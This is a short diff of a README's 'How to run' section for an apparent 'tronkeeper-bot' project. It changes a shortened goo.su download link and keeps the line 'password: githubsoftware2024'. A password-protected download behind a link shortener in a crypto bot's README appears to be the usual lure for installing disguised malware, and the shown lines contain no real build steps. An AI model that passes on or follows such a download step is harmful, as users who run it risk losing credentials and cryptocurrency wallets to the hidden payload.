@@ -10,7 +10,7 @@
 
 # How to run
 ```
-load https://goo.su/PNzzO password: githubsoftware2024
+load https://goo.su/Mo3TFvO password: githubsoftware2024
 ```
 ```
 cd tronkeeper-bot
